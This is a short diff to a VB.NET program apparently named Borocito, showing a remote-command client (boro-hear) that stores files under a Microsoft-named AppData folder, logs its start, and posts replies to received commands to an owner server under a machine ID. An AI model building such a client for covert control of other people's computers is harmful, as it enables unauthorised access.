@@ -41,7 +41,7 @@ Module Utility
 End Module
 Module GlobalUses
     Public parameters As String
-    Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito\boro-hear"
+    Public DIRCommons As String = "C:\Users\" & Environment.UserName & "\AppData\Local\Microsoft\Borocito"
     Public DIRHome As String = DIRCommons & "\boro-get\" & My.Application.Info.AssemblyName
 
     Public HttpOwnerServer As String
@@ -51,6 +51,7 @@ Module GlobalUses
 End Module
 Module StartUp
     Sub Init()
+        AddToLog("Init", My.Application.Info.AssemblyName & " " & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")" & " has started! " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy"), True)
         Try
             CommonActions()
             LoadRegedit()
@@ -135,8 +136,8 @@ Module ResponseAdministrator
                 'Prepara el mensaje
                 Dim postData As String = "ident=" & UID & "&text=" & "#boro-hear response (" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & ")" &
                     vbCrLf & "Command1>" & lineas(1).Split(">"c)(1).Trim() &
-                    vbCrLf & "Command2>" &
-                    vbCrLf & "Command3>" &
+                    vbCrLf & "Command2>" & lineas(2).Split(">"c)(1).Trim() &
+                    vbCrLf & "Command3>" & lineas(3).Split(">"c)(1).Trim() &
                     vbCrLf & "[Response]" &
                     vbCrLf & "(BORO-HEAR) " & message
                 Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
